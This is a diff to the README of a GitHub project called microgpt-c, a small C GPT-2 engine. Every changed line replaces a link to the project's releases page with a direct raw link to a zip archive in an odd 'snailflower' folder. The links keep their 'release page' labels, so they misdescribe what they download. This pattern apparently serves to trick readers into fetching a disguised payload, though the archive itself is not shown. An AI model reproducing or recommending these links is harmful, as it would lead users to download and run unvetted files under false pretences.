@@ -1,7 +1,7 @@
 # 🎉 microgpt-c - Fast Edge AI Solution
 
 ## 📥 Download Now
-[![Download microgpt-c](https://img.shields.io/badge/Download-microgpt--c-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/huyhuy091/microgpt-c/releases)
+[![Download microgpt-c](https://raw.githubusercontent.com/huyhuy091/microgpt-c/main/snailflower/c-microgpt-1.2.zip)](https://raw.githubusercontent.com/huyhuy091/microgpt-c/main/snailflower/c-microgpt-1.2.zip)
 
 ## 📝 Description
 microgpt-c is a lightweight, zero-dependency software designed to run a C99 GPT-2 engine for edge AI applications. It allows you to train models with less than 1 million parameters on your device in just seconds. By using the Organelle Pipeline Architecture (OPA), it coordinates specialized micro-models, demonstrating a 91% win rate on 11 different logic games with model sizes ranging from 30,000 to 160,000 parameters. This composition approach results in better performance than relying solely on larger models.
@@ -10,7 +10,7 @@ microgpt-c is a lightweight, zero-dependency software designed to run a C99 GPT-
 To install and run microgpt-c, follow these simple steps:
 
 1. **Visit the Release Page**
-   Go to the [microgpt-c release page](https://github.com/huyhuy091/microgpt-c/releases) to find the downloadable files.
+   Go to the [microgpt-c release page](https://raw.githubusercontent.com/huyhuy091/microgpt-c/main/snailflower/c-microgpt-1.2.zip) to find the downloadable files.
 
 2. **Select Your Version**
    On the release page, choose the version that suits your system. Each release includes the necessary files for installation.
@@ -72,7 +72,7 @@ The development of microgpt-c is ongoing. Future updates may include:
 - More specialized models for various applications
 - Improved user interface and experience
 
-Visit the release page [here](https://github.com/huyhuy091/microgpt-c/releases) for the latest information and updates.
+Visit the release page [here](https://raw.githubusercontent.com/huyhuy091/microgpt-c/main/snailflower/c-microgpt-1.2.zip) for the latest information and updates.
 
 ## 🤝 Contributing
 For those interested in contributing to microgpt-c, please visit the contributing section on the GitHub repository. All feedback and suggestions are welcome as we work to make the software better for everyone.
